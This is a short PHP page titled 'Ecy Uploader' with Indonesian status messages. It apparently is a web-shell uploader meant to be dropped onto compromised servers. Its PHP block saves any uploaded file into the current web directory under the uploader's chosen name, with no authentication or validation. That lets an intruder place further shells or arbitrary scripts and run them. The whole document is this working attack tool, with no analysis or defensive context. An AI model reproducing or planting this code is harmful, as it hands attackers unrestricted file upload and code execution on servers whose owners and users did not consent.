<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>Ecy Uploader</title>
</head>
<body>
	<form action="" method="post" enctype="multipart/form-data">
		<input type="file" name="file" size="50">
		<input name="_upl" type="submit" id="_upl" value="Upload">
	</form>
	<?php
	if ($_POST['_upl'] == "Upload") {
		if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
			echo '<b>Sukses!!!<b><br><br>';
		} else {
			echo '<b>Gagal!!!</b><br><br>';
		}
	}
	?>

</body>
</html>